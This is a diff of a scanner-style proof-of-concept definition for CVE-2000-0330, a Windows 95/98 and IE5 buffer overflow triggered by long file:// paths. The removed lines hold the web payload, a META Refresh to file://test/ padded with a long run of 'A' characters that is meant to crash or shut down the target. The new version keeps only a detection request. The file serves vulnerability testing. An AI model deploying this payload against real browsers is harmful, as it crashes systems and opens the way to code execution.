@@ -1,14 +1,13 @@
 [info]
 author = "AVE"
-description = "Windows 95/98 网络软件在处理 file:// URL 长文件名时存在缓冲区溢出漏洞。通过构造包含超长文件名的 HTML 页面，使用 META Refresh 跳转到 file://test/ 后接大量填充字符，可触发目标系统 IE 浏览器中的溢出，导致远程代码执行或系统崩溃。此 PoC 生成并托管恶意 HTML 页面。"
+description = "检测 Microsoft Windows 95/98 网络组件处理超长 UNC/file:// 路径时的缓冲区溢出漏洞。通过 HTTP 服务构造包含超长文件名的恶意 HTML 页面，当目标用户使用 IE5 浏览器访问时触发溢出，可导致远程代码执行。"
 id = "POC-AVE-2000-0274"
-name = "CVE-2000-0330 PoC"
+name = "Microsoft Windows 95/98 UNC Buffer Overflow PoC"
 severity = "high"
 tags = [
     "cve-2000-0330",
     "windows",
     "buffer-overflow",
-    "unc",
 ]
 vuln_id = [
     "CVE-2000-0330",
@@ -20,21 +19,11 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cve-2000-0330.html"
+path = "/{{BaseURL}}/"
 protocol = "http"
-
-[poc.requests.body]
-content = '<META HTTP-EQUIV="Refresh" CONTENT="0;URL=file://test/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"><HTML><B>10 seconds later, this machine will be shut down.</B><BR><BR>If you are using IE5 for Japanese Windows98, maybe, the exploit code which shuts down your machine will be executed.<BR></HTML>'
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "text/html"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = [
-    'META HTTP-EQUIV="Refresh"',
-    "file://test/",
-]
+words = ["file://"]
